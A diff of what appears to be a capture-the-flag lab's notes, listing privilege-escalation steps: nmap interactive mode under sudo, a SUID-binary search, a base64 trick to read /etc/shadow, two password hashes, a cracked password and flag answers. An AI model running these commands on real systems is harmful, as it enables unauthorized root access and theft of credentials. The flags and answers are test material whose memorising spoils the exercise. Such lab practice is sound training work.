@@ -39,20 +39,29 @@ cat /home/ubuntu/flag2.txt
 THM-402028394
 
 sudo nmap -interactive
+
 cat /etc/shadow
+
 $6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1
 
 cat /etc/passwd
+
 gerryconway
 
 find / -type f -perm -04000 -ls 2>/dev/null
 
 LFILE=/etc/shadow
+
 /usr/bin/base64 "$LFILE" | base64 --decode
+
 $6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/
+
 Password1
 
 find / -type f -name '*flag3*.txt' 2>/dev/null
+
 LFILE=/home/ubuntu/flag3.txt
+
 /usr/bin/base64 "$LFILE" | base64 --decode
+
 THM-3847834
